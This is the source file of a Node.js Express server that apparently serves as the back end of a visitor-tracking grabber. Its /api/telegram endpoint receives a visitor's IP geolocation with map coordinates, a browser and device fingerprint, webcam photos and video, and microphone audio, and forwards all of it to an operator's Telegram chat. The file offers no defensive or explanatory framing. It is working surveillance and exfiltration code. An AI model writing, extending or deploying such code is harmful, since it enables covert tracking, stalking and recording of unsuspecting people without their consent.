const express = require('express');
const cors = require('cors');

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('❌ Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
}

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));

// ================================================================
// Build a FULL, human-readable message (no truncation, no base64)
// We will send the canvas as a separate photo later.
// ================================================================
function buildMessage(ipData, fingerprint) {
    let msg = '📡 *New Visitor Info*\n\n';

    // --- IP Info (every field) ---
    if (ipData) {
        msg += '*IP Info:*\n';
        msg += `IP: ${ipData.ip || 'N/A'}\n`;
        if (ipData.city) msg += `City: ${ipData.city}\n`;
        if (ipData.region) msg += `Region: ${ipData.region}\n`;
        if (ipData.region_code) msg += `Region Code: ${ipData.region_code}\n`;
        if (ipData.country_name) msg += `Country: ${ipData.country_name}\n`;
        if (ipData.country_code) msg += `Country Code: ${ipData.country_code}\n`;
        if (ipData.continent_code) msg += `Continent: ${ipData.continent_code}\n`;
        if (ipData.postal) msg += `Postal: ${ipData.postal}\n`;
        if (ipData.latitude && ipData.longitude) {
            msg += `Location: ${ipData.latitude}, ${ipData.longitude}\n`;
            msg += `Maps: https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}\n`;
        }
        if (ipData.org) msg += `ISP: ${ipData.org}\n`;
        if (ipData.timezone) msg += `Timezone: ${ipData.timezone}\n`;
        if (ipData.utc_offset) msg += `UTC Offset: ${ipData.utc_offset}\n`;
        msg += '\n';
    }

    // --- Fingerprint (full) ---
    if (fingerprint) {
        msg += '*Device & Browser:*\n';
        msg += `User Agent: ${fingerprint.userAgent || 'N/A'}\n`;
        msg += `Platform: ${fingerprint.platform || 'N/A'}\n`;
        msg += `Language: ${fingerprint.language || 'N/A'}\n`;
        if (fingerprint.screen) {
            msg += `Screen: ${fingerprint.screen.width}x${fingerprint.screen.height} `;
            msg += `(${fingerprint.screen.colorDepth}bit, ratio ${fingerprint.screen.pixelRatio})\n`;
        }
        msg += `Touch Points: ${fingerprint.maxTouchPoints}\n`;
        msg += `Cores: ${fingerprint.hardwareConcurrency}\n`;
        msg += `Memory: ${fingerprint.deviceMemory} GB\n`;
        msg += `Timezone: ${fingerprint.timezone}\n`;
        if (fingerprint.webgl && fingerprint.webgl !== 'not supported' && fingerprint.webgl !== 'unsupported') {
            msg += `GPU Vendor: ${fingerprint.webgl.vendor}\n`;
            msg += `GPU Renderer: ${fingerprint.webgl.renderer}\n`;
        }
        // Canvas fingerprint – mention it will be sent as a separate image
        if (fingerprint.canvas) {
            msg += `Canvas fingerprint: captured (sent as image below)\n`;
        }
        msg += '\n';
    }

    msg += `*Timestamp:* ${new Date().toISOString()}`;
    return msg;
}

// ================================================================
// Safe chunked sending – never exceed 4096 bytes per message
// ================================================================
async function sendSingleChunk(text) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text,
            parse_mode: 'Markdown'
        })
    });
    if (!res.ok) {
        const err = await res.json();
        console.error('❌ Telegram sendMessage failed:', err);
    }
}

async function sendLongMessage(text) {
    const MAX_BYTES = 3900; // safe margin below 4096
    const buf = Buffer.from(text, 'utf8');
    console.log(`[DEBUG] Full message byte length: ${buf.length}`);

    if (buf.length <= MAX_BYTES) {
        await sendSingleChunk(text);
        return;
    }

    // Split into chunks, ensuring valid UTF-8 boundaries
    const chunks = [];
    let start = 0;
    while (start < buf.length) {
        let end = Math.min(start + MAX_BYTES, buf.length);
        // If we're not at the end, avoid cutting a multi-byte character
        if (end < buf.length) {
            while (end > start && (buf[end] & 0xC0) === 0x80) end--;
        }
        chunks.push(buf.slice(start, end).toString('utf8'));
        start = end;
    }

    console.log(`[DEBUG] Splitting into ${chunks.length} parts`);
    for (let i = 0; i < chunks.length; i++) {
        const prefix = chunks.length > 1 ? `[${i + 1}/${chunks.length}] ` : '';
        await sendSingleChunk(prefix + chunks[i]);
    }
}

// ================================================================
// Media senders (unchanged)
// ================================================================
async function sendPhoto(base64, caption = '') {
    try {
        const b = base64.includes(',') ? base64.split(',')[1] : base64;
        const buf = Buffer.from(b, 'base64');
        const fd = new FormData();
        fd.append('chat_id', TELEGRAM_CHAT_ID);
        fd.append('photo', new Blob([buf], { type: 'image/jpeg' }), 'webcam.jpg');
        if (caption) fd.append('caption', caption);
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
    } catch(e) { console.error('sendPhoto error:', e); }
}

async function sendVideo(base64, caption = '') {
    try {
        const b = base64.includes(',') ? base64.split(',')[1] : base64;
        const buf = Buffer.from(b, 'base64');
        const fd = new FormData();
        fd.append('chat_id', TELEGRAM_CHAT_ID);
        fd.append('video', new Blob([buf], { type: 'video/mp4' }), 'webcam.mp4');
        if (caption) fd.append('caption', caption);
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
    } catch(e) { console.error('sendVideo error:', e); }
}

async function sendAudio(base64) {
    try {
        const b = base64.includes(',') ? base64.split(',')[1] : base64;
        const buf = Buffer.from(b, 'base64');
        const fd = new FormData();
        fd.append('chat_id', TELEGRAM_CHAT_ID);
        fd.append('audio', new Blob([buf], { type: 'audio/wav' }), 'mic.wav');
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`, { method: 'POST', body: fd });
    } catch(e) { console.error('sendAudio error:', e); }
}

// ================================================================
// MAIN ENDPOINT
// ================================================================
app.post('/api/telegram', async (req, res) => {
    try {
        const { ipData, fingerprint, photo, video, mic, timestamp } = req.body;

        console.log(`[+] Received at ${timestamp}`);
        console.log(`[+] IP: ${ipData?.ip}`);
        console.log(`[+] Photo: ${photo ? 'yes' : 'no'}`);
        console.log(`[+] Video: ${video ? 'yes' : 'no'}`);
        console.log(`[+] Mic: ${mic ? 'yes' : 'no'}`);

        // 1. Send the full text summary (split if needed)
        const message = buildMessage(ipData, fingerprint);
        await sendLongMessage(message);

        // 2. Send canvas fingerprint as a separate image (if present)
        if (fingerprint && fingerprint.canvas && fingerprint.canvas.length > 50) {
            await sendPhoto(fingerprint.canvas, '🖼 Canvas fingerprint');
        }

        // 3. Send captured media
        if (photo) await sendPhoto(photo, '📸 Webcam snapshot');
        if (video) await sendVideo(video, '🎥 Webcam video (3s)');
        if (mic) await sendAudio(mic);

        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));